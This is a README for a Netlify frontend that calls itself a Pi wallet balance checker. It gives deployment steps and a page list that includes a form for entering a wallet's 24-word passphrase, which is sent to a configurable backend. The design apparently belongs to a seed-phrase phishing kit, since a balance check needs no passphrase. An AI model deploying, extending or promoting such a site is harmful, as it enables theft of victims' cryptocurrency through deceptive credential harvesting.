# Pi Wallet Balance Checker - Frontend (Netlify)

Static frontend for Pi wallet balance checker.

## Setup (Environment Variable)

1. In your Netlify project dashboard, go to **Site settings > Build & deploy > Environment variables**.
2. Add a variable:
   - **Key:** `API_URL`
   - **Value:** Your deployed backend URL (e.g., `https://your-backend.up.railway.app/api/check-balances`)
3. Deploy the site. The build command (`node generate-config.js`) will automatically create `js/config.js` from this variable.
4. No manual code editing required.

**Important:** If you deploy without setting `API_URL`, a placeholder URL will be used. Make sure to set the variable before build.

## Pages

- `index.html` – Landing page with "Unlock your Pi" button.
- `unlock.html` – Enter 24-word passphrase.
- `feedback.html` – Shows success message with locked balance.
- `find-passphrase.html` – Instructions to locate passphrase.